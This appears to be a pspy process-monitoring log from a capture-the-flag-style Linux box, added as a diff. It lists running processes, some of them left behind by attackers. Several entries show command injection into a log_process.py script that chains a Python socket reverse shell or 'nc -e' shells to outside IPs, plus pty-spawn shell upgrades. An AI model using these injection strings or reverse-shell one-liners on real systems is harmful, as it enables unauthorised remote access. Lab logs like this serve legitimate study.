@@ -1,0 +1,289 @@
+pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done
+2021/09/06 20:38:26 [36;1mCMD: UID=101  PID=972    | /lib/systemd/systemd-resolved [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=96     | [0m
+2021/09/06 20:38:26 [31;1mCMD: UID=100  PID=945    | /lib/systemd/systemd-networkd [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=91     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=90     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=9      | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=89     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=88     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=87     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=85     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=827    | /usr/bin/vmtoolsd [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=821    | /usr/bin/VGAuthService [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=8      | [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=62583 PID=746    | /lib/systemd/systemd-timesyncd [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=719    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=717    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=7      | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=6      | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=578    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=564    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=563    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=562    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=561    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=558    | /lib/systemd/systemd-udevd [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=552    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=547    | /sbin/lvmetad -f [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=544    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=538    | /lib/systemd/systemd-journald [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=467    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=466    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=43     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=42     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=41     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=401    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=4      | [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=3891   | tee pspy [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=3890   | ./pspy64 [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=3889   | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=3888   | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=3887   | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=3831   | [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=3807   | /usr/sbin/apache2 -k start [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=3803   | /usr/sbin/apache2 -k start [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=3795   | /bin/bash [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=3794   | python3 -c import pty;pty.spawn("/bin/bash") [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=3792   | sh [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=3791   | sh -c sh [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=3789   | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=37     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=3668   | [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=3658   | /usr/sbin/apache2 -k start [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=3641   | /bin/sh [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=3640   | python -c import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.160",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh") [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=3637   | sh -c /usr/bin/python /opt/scripts/log_process.py comma;python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.160",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=36     | [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=3502   | /usr/sbin/apache2 -k start [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=35     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=3488   | bash -i [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=3486   | /bin/bash /opt/scripts/access_backup.sh [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=3485   | /bin/bash /opt/scripts/access_backup.sh [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=3484   | sudo /opt/scripts/access_backup.sh [0m
+2021/09/06 20:38:26 [35;1mCMD: UID=1000 PID=3415   | -bash [0m
+2021/09/06 20:38:26 [35;1mCMD: UID=1000 PID=3410   | sshd: m4lwhere@pts/2 [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=34     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=33     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=3297   | sshd: m4lwhere [priv][0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=3296   | /usr/sbin/apache2 -k start [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=3294   | /usr/sbin/apache2 -k start [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=3287   | /usr/sbin/apache2 -k start [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=3274   | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=325    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=324    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=322    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=321    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=32     | [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=3165   | /usr/sbin/apache2 -k start [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=3163   | mysql -u root -D previse -p [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=315    | [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=3145   | /usr/sbin/apache2 -k start [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=3137   | /usr/sbin/apache2 -k start [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=312    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=310    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=31     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=309    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=308    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=307    | [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=3068   | /usr/sbin/apache2 -k start [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=30     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=29     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=28     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=279    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=278    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=277    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=276    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=275    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=274    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=273    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=272    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=271    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=270    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=27     | [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=2699   | bash [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=2698   | sh -c bash [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=2697   | script /dev/null -c bash [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=2695   | bash [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=2693   | sh -c /usr/bin/python /opt/scripts/log_process.py comma&nc -e /bin/bash 10.10.14.55 8888 [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=269    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=268    | [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=2676   | /usr/sbin/apache2 -k start [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=267    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=266    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=265    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=264    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=263    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=262    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=261    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=260    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=26     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=258    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=254    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=251    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=250    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=25     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=248    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=247    | [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=2469   | /usr/sbin/apache2 -k start [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=2467   | /usr/sbin/apache2 -k start [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=2456   | /usr/sbin/apache2 -k start [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=2451   | /usr/sbin/apache2 -k start [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=2447   | /usr/sbin/apache2 -k start [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=2434   | /usr/sbin/apache2 -k start [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=24     | [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=2398   | /usr/sbin/apache2 -k start [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=2397   | /usr/sbin/apache2 -k start [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=2392   | /usr/sbin/apache2 -k start [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=2391   | /usr/sbin/apache2 -k start [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=2388   | ping 10.10.14.55 [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=2386   | sh -c /usr/bin/python /opt/scripts/log_process.py comma&ping 10.10.14.55 [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=2371   | /usr/sbin/apache2 -k start [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=236    | [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=2343   | /usr/sbin/apache2 -k start [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=234    | [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=2330   | /usr/sbin/apache2 -k start [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=233    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=23     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=223    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=22     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=217    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=211    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=21     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=206    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=201    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=200    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=20     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=2      | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=199    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=198    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=197    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=196    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=195    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=194    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=193    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=192    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=191    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=190    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=19     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=189    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=188    | [0m
+2021/09/06 20:38:26 [35;1mCMD: UID=1000 PID=1874   | bash [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=187    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=186    | [0m
+2021/09/06 20:38:26 [35;1mCMD: UID=1000 PID=1859   | (sd-pam) [0m
+2021/09/06 20:38:26 [35;1mCMD: UID=1000 PID=1850   | /lib/systemd/systemd --user [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=185    | [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=1848   | su m4lwhere [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=1841   | /bin/bash [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=1840   | python -c import pty; pty.spawn("/bin/bash") [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=184    | [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=1831   | sh [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=183    | [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=1829   | sh -c /usr/bin/python /opt/scripts/log_process.py comma&nc -e /bin/sh 10.10.14.129 3989 [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=182    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=181    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=180    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=18     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=179    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=178    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=177    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=176    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=175    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=174    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=173    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=16     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=15     | [0m
+2021/09/06 20:38:26 [36;1mCMD: UID=33   PID=1423   | /usr/sbin/apache2 -k start [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=14     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=1389   | /usr/sbin/apache2 -k start [0m
+2021/09/06 20:38:26 [31;1mCMD: UID=111  PID=1349   | /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=13     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=1289   | /usr/lib/policykit-1/polkitd --no-debug [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=1288   | /sbin/agetty -o -p -- \u --noclear tty1 linux [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=1287   | /usr/sbin/sshd -D [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=122    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=12     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=103  PID=1182   | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=1178   | /lib/systemd/systemd-logind [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=1172   | /usr/lib/accountsservice/accounts-daemon [0m
+2021/09/06 20:38:26 [35;1mCMD: UID=102  PID=1116   | /usr/sbin/rsyslogd -n [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=1115   | /usr/sbin/irqbalance --foreground [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=1103   | /usr/sbin/atd -f [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=1100   | /usr/bin/lxcfs /var/lib/lxcfs/ [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=11     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=1098   | /usr/sbin/cron -f [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=1097   | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=105    | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=10     | [0m
+2021/09/06 20:38:26 [34;1mCMD: UID=0    PID=1      | /sbin/init maybe-ubiquity [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3901   | (ionclean) [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3911   | /bin/sh -e /usr/lib/php/sessionclean [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3910   | sort -u -t: -k 1,1 [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3909   | /bin/sh /usr/sbin/phpquery -V [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3908   | sort -rn -t: -k2,2 [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3907   | /bin/sh -e /usr/lib/php/sessionclean [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3925   | /lib/systemd/systemd-udevd [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3924   | find /usr/lib/php -mindepth 1 -maxdepth 1 -regex .*[0-9]\.[0-9] -printf %f
+n [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3923   | /lib/systemd/systemd-udevd [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3922   | /lib/systemd/systemd-udevd [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3921   | /bin/sh /usr/sbin/phpquery -V [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3920   | /lib/systemd/systemd-udevd [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3919   | /lib/systemd/systemd-udevd [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3918   | sort -rn [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3917   | /bin/sh /usr/sbin/phpquery -V [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3916   | /lib/systemd/systemd-udevd [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3914   | /lib/systemd/systemd-udevd [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3913   | /lib/systemd/systemd-udevd [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3926   | php7.2 -c /etc/php/7.2/apache2/php.ini -d error_reporting='~E_ALL' -r foreach(ini_get_all("session") as $k => $v) echo "$k=".$v["local_value"]."\n"; [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3938   | [0m
+2021/09/06 20:39:01 [36;1mCMD: UID=???  PID=3937   | ???[0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3936   | [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3939   | php7.2 -c /etc/php/7.2/cli/php.ini -d error_reporting='~E_ALL' -r foreach(ini_get_all("session") as $k => $v) echo "$k=".$v["local_value"]."\n"; [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3943   | [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3951   | sed -e s,@VERSION@,7.2, [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3949   | /bin/sh -e /usr/lib/php/sessionclean [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3952   | pidof apache2 php7.2 [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3953   | find /proc/3807/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ; [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3954   | find /proc/3803/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ; [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3961   | find /proc/3165/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ; [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3962   | [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3963   | find /proc/3137/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ; [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3964   | find /proc/3068/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ; [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3965   | find /proc/2676/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ; [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3967   | find /proc/2469/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ; [0m
+2021/09/06 20:39:01 [36;1mCMD: UID=???  PID=3968   | [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3969   | find /proc/2467/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ; [0m
+2021/09/06 20:39:01 [36;1mCMD: UID=???  PID=3970   | ???[0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3971   | find /proc/2456/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ; [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3973   | find /proc/2451/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ; [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3975   | find /proc/2447/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ; [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3977   | find /proc/2434/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ; [0m
+2021/09/06 20:39:01 [36;1mCMD: UID=???  PID=3978   | ???[0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3979   | find /proc/2398/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ; [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3981   | find /proc/2397/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ; [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3983   | find /proc/2392/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ; [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3985   | find /proc/2391/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ; [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3987   | find /proc/2371/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ; [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3989   | find /proc/2343/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ; [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3991   | find /proc/2330/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ; [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3993   | find /proc/1423/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ; [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3995   | find /proc/1389/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ; [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=3996   | find -O3 /var/lib/php/sessions/ -ignore_readdir_race -depth -mindepth 1 -name sess_* -type f -cmin +24 -delete [0m
+2021/09/06 20:39:01 [34;1mCMD: UID=0    PID=4008   | [0m
